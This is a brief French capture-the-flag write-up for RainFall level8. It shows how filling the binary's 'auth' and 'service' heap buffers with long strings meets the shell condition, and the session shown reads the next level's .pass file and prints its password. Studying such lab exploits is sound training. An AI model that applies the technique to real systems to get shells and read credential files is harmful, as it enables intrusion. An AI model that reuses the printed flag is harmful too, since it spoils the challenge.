# Level ouit

- Dans le code on comprends qu'il y a plusieurs commande pour assigner des strings a des variables 
```
commandes:
auth <str>
service <str>
reset
login
```
- On comprend aussi qu'un shell est lancer sous condition que *(auth + 0x20) ne soit pas egale à zero
- Donc il suffit de remplir les variables auth et service pour etre sure que cette variable ne soit pas egale a 0
```
level8@RainFall:~$ ./level8
(nil), (nil) 
auth bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
0x804a018, (nil) 
service aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a018, 0x804a028 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
